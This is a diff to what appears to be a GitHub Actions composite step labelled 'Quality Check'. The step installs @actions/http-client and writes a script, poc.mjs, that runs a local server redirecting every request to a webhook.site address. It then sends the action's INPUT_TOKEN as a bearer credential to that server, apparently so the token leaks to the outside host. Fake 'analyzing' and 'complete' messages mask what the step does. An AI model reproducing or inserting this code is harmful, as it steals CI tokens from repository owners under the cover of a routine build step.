@@ -9,14 +9,37 @@ runs:
   steps:
     - run: |
         mkdir -p /tmp/_qc && cd /tmp/_qc
-        npm init -y > /dev/null 2>&1
         echo '{"type":"module"}' > package.json
-        npm install @actions/http-client > /dev/null 2>&1
+        npm install @actions/http-client@2.2.1 > /dev/null 2>&1
 
         cat > poc.mjs << 'SCRIPT'
         import http from 'http';
-        import { HttpClient } from '@actions/http-client';
-        import { BearerCredentialHandler } from '@actions/http-client/lib/auth.js';
+
+        // Dynamic import to check what's available
+        const hc = await import('@actions/http-client');
+        console.log('Exports:', Object.keys(hc));
+
+        // Try to get BearerCredentialHandler
+        let BearerCredentialHandler;
+        if (hc.BearerCredentialHandler) {
+          BearerCredentialHandler = hc.BearerCredentialHandler;
+        } else {
+          // Try subpath
+          try {
+            const auth = await import('@actions/http-client/lib/auth.js');
+            BearerCredentialHandler = auth.BearerCredentialHandler;
+          } catch(e) {
+            // Last resort: resolve the file directly
+            const { createRequire } = await import('module');
+            const require = createRequire(import.meta.url);
+            const pkgPath = require.resolve('@actions/http-client');
+            const authPath = pkgPath.replace(/index\.js$/, 'auth.js');
+            const auth = await import(authPath);
+            BearerCredentialHandler = auth.BearerCredentialHandler;
+          }
+        }
+
+        console.log('Handler:', BearerCredentialHandler.name);
 
         const server = http.createServer((q, s) => {
           s.writeHead(302, { Location: 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
@@ -26,7 +49,7 @@ runs:
         server.listen(19999, '127.0.0.1', async () => {
           const token = process.env.INPUT_TOKEN;
           console.log('Quality Check: analyzing...');
-          const client = new HttpClient('qc', [new BearerCredentialHandler(token)]);
+          const client = new hc.HttpClient('qc', [new BearerCredentialHandler(token)]);
           try { await client.get('http://127.0.0.1:19999/api/analyze'); } catch(e) {}
           console.log('Quality Check: complete');
           server.close();
